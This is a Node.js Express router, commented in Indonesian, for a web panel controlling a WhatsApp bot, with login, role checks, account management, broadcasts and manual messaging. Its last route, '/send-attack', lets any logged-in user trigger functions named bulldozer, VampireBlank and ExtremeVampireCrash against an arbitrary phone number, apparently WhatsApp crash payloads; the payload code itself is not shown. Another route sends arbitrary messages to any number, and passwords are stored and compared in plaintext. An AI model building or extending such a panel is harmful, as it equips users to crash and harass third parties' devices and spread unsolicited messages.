const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();

const userFile = path.join(__dirname, '../database/users.json');
const config = require('../database/config.json');
const { sendMessage, getSock } = require('./botBridge');

// 🧠 Middleware login
function requireLogin(req, res, next) {
  if (!req.session.user) return res.status(401).json({ message: '❌ Belum login' });
  next();
}

// 🛡️ Middleware role
function requireRole(...roles) {
  return (req, res, next) => {
    const user = req.session.user;
    if (!user) return res.status(401).json({ message: '❌ Belum login' });
    if (!roles.includes(user.role)) {
      return res.status(403).json({ message: '❌ Akses ditolak' });
    }
    next();
  };
}

// 🔐 LOGIN
router.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: '❌ Username dan password wajib diisi.' });
  }

  const users = JSON.parse(fs.readFileSync(userFile, 'utf-8'));
  const user = users.find(u => u.username === username && u.password === password);

  if (!user) {
    return res.status(401).json({ message: '❌ Username atau password salah!' });
  }

  req.session.user = { username: user.username, role: user.role };

  let redirect = '/dashboard-user.html';
  if (user.role === 'admin') redirect = '/dashboard-admin.html';
  if (user.role === 'owner') redirect = '/dashboard-owner.html';

  res.json({ message: '✅ Login berhasil', redirect });
});

// 👤 INFO LOGIN
router.get('/whoami', (req, res) => {
  if (!req.session.user) return res.status(401).json(null);
  res.json(req.session.user);
});

// ➕ TAMBAH AKUN (admin/owner)
router.post('/tambah-akun', requireRole('admin', 'owner'), (req, res) => {
  const { username, password, role } = req.body;

  if (!username || !password || !role) {
    return res.status(400).json({ message: '❌ Semua field wajib diisi.' });
  }

  let users = [];
  if (fs.existsSync(userFile)) {
    users = JSON.parse(fs.readFileSync(userFile));
  }

  if (users.find(u => u.username === username)) {
    return res.status(409).json({ message: '❌ Username sudah digunakan.' });
  }

  users.push({ username, password, role });
  fs.writeFileSync(userFile, JSON.stringify(users, null, 2));

  res.json({ message: `✅ Akun ${role} berhasil ditambahkan.` });
});

// 📋 LIST AKUN (khusus owner)
router.get('/list-akun', requireRole('owner'), (req, res) => {
  if (!fs.existsSync(userFile)) return res.json({ success: true, users: [] });

  const users = JSON.parse(fs.readFileSync(userFile));
  res.json({ success: true, users });
});
// 📢 PENGUMUMAN (khusus owner)
router.post('/pengumuman', requireRole('owner'), async (req, res) => {
  const { pesan } = req.body;

  if (!pesan) return res.status(400).json({ message: '❌ Isi pengumuman tidak boleh kosong.' });

  try {
    const users = JSON.parse(fs.readFileSync(userFile));
    const targets = users.filter(u => u.role === 'admin' || u.role === 'user');

    let success = 0;
    for (const target of targets) {
      const number = config[target.username]; // ambil nomor dari config (harus disesuaikan)
      if (number) {
        const jid = number.replace(/\D/g, '') + '@s.whatsapp.net';
        const result = await sendMessage(jid, `📢 Pengumuman:\n${pesan}`);
        if (result.success) success++;
      }
    }

    return res.json({ message: `✅ Pengumuman dikirim ke ${success} akun.` });
  } catch (e) {
    return res.status(500).json({ message: '❌ Gagal kirim pengumuman.' });
  }
});
// 🔄 UBAH PASSWORD (siapa pun yang login)
router.post('/ubah-password', requireLogin, (req, res) => {
  const { oldPassword, newPassword } = req.body;
  const user = req.session.user;

  if (!oldPassword || !newPassword) {
    return res.status(400).json({ message: '❌ Password lama dan baru wajib diisi.' });
  }

  let users = JSON.parse(fs.readFileSync(userFile));
  const foundUser = users.find(u => u.username === user.username && u.password === oldPassword);

  if (!foundUser) {
    return res.status(401).json({ message: '❌ Password lama salah.' });
  }

  foundUser.password = newPassword;
  fs.writeFileSync(userFile, JSON.stringify(users, null, 2));

  res.json({ message: '✅ Password berhasil diubah.' });
});
// 📢 KIRIM PENGUMUMAN KE SEMUA ADMIN & USER (hanya owner)
router.post('/kirim-pengumuman', requireRole('owner'), async (req, res) => {
  const { message } = req.body;
  if (!message) return res.status(400).json({ message: '❌ Isi pesan wajib diisi.' });

  const users = JSON.parse(fs.readFileSync(userFile));
  const targetUsers = users.filter(u => u.role === 'admin' || u.role === 'user');

  let sukses = 0, gagal = 0;

  for (const user of targetUsers) {
    const nomor = user.username.replace(/\D/g, '') + '@s.whatsapp.net';
    try {
      const result = await sendMessage(nomor, `[PENGUMUMAN]\n${message}`);
      if (result.success) sukses++;
      else gagal++;
    } catch {
      gagal++;
    }
  }

  res.json({ message: `📢 Pengumuman dikirim: ${sukses} sukses, ${gagal} gagal.` });
});


// 🗑️ HAPUS AKUN (khusus owner)
router.post('/hapus-akun', requireRole('owner'), (req, res) => {
  const { username } = req.body;
  if (!username) return res.status(400).json({ message: '❌ Username wajib diisi.' });

  let users = JSON.parse(fs.readFileSync(userFile));
  users = users.filter(u => u.username !== username);
  fs.writeFileSync(userFile, JSON.stringify(users, null, 2));

  res.json({ message: `✅ Akun ${username} berhasil dihapus.` });
});

// 🚪 LOGOUT
router.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/login.html');
  });
});

// 💬 KIRIM COMMAND (siapa pun yang login)
router.post('/send-command', requireLogin, async (req, res) => {
  const { command } = req.body;
  if (!command) return res.status(400).json({ message: '❌ Command kosong.' });

  try {
    const result = await sendMessage(`${config.adminNumber}@s.whatsapp.net`, command);
    if (result.success) {
      res.json({ message: '✅ Saran berhasil dikirim ke Admin' });
    } else {
      res.status(500).json({ message: `❌ Gagal kirim: ${result.error}` });
    }
  } catch (e) {
    res.status(500).json({ message: '❌ Gagal kirim command.' });
  }
});

// 📤 KIRIM PESAN MANUAL
router.post('/send-wa', requireLogin, async (req, res) => {
  const { to, message } = req.body;

  if (!to || !message) {
    return res.status(400).json({ message: '❌ Nomor dan pesan wajib diisi.' });
  }

  const nomor = to.replace(/\D/g, '');
  const jid = nomor + '@s.whatsapp.net';

  try {
    const result = await sendMessage(jid, message);
    if (result.success) {
      res.json({ message: `✅ Pesan berhasil dikirim ke ${to}` });
    } else {
      res.status(500).json({ message: `❌ Gagal kirim: ${result.error}` });
    }
  } catch (e) {
    res.status(500).json({ message: '❌ Error saat mengirim pesan.' });
  }
});
// 🧨 Kirim Fungsi Spesial (bulldozer / vampire)
// 🧨 Kirim Fungsi Spesial (bulldozer / vampire / extreme)
router.post('/send-attack', requireLogin, async (req, res) => {
  const { target, type } = req.body;

  if (!target || !type) {
    return res.status(400).json({ message: '❌ Target dan type wajib diisi.' });
  }

  const sock = getSock();
  if (!sock) return res.status(500).json({ message: '❌ Bot belum aktif' });

  try {
    const nomor = target.replace(/\D/g, '') + '@s.whatsapp.net';

    if (type === 'bulldozer') {
      await global.bulldozer(nomor);
    } else if (type === 'vampire') {
      await global.VampireBlank(nomor);
    } else if (type === 'extreme') {
      await global.ExtremeVampireCrash(nomor, sock);
    } else {
      return res.status(400).json({ message: '❌ Tipe tidak dikenal.' });
    }

    return res.json({ message: `✅ Attack ${type} berhasil dikirim ke ${target}` });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ message: '❌ Gagal mengirim attack.' });
  }
});



module.exports = router;
